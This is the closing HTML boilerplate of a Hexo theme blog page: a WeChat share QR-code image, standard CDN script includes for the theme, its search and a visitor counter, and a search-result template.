    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsklEQVR42u3a0W7jMAwEwPz/T7evB6RRlqQY5IDxU5A6ssYFLHnJxyM+fp6Of79/Puf5t+fPk/MvHHh4eHjjqb9iJBOqXvF8+87s85zx8PDwtnn5A/rWTZk/yaMbjYeHh/dlvPOEetv08/l4eHh4/y8v31jnj/UvWhjw8PDwAl4+XL6NnoxTDS8uZC14eHh4MS8PCL7n80p9Dw8PD28cmFYf2ZN4orfYvJktHh4e3gKvGjRMNta9kGISDePh4eFt8JJi/zxInZTH3vxnzr/Fw8PDW+PNQ4rtGLdZVMPDw8Nb4CVRaa/slJCqQUM+Gh4eHt4eL98unwfNi1WTeHe0auHh4eEt8KoRwBw5mU8U8uLh4eF9kFcNBaohRXWDnsztTWcEHh4e3gLv/MJfjRh6W+RqC0LUboWHh4e3zItKSq0go7cMJNd6+Q0eHh7eGq/3qp9frNqs0GtH+OO6eHh4eAu8anTb7E1oNRPMA188PDy8DV7e0lTdBM8nWgW/abrCw8PDW+NNtrnVdoFRRJssVHh4eHhrvHzQZELVM6tLS6EIh4eHh7fMy5eH5K95U0KyAFS35n8sDHh4eHgLvF6fUm+RqN6masMWHh4e3h6vV+CvbpGrC8Ot+AMPDw9vj1cNJiaLR7UxK2FHTQ94eHh4V3nNwnzwsE6mVY2Mo2WgmmTg4eHhtXjV8tWkxHW3PavZWYaHh4c35lVL+5NlILmJ1ePlCHh4eHhXeZO4obowVLfXhRLXqxHw8PDwFnjzN/oq+DzC5Py8gIeHh4c3503KWtfuX7GZII+D8fDw8PZ41cJYNWxNHvGjQlce4+Lh4eF9nFfdFk++6RXYHtVT8fDw8D7C21sqetWrQn0PDw8P7xIvDwImZbAefrL1x8PDw9vgVV/v88B33vB6K57Aw8PDu8T7BW/GK/DqJ/R5AAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
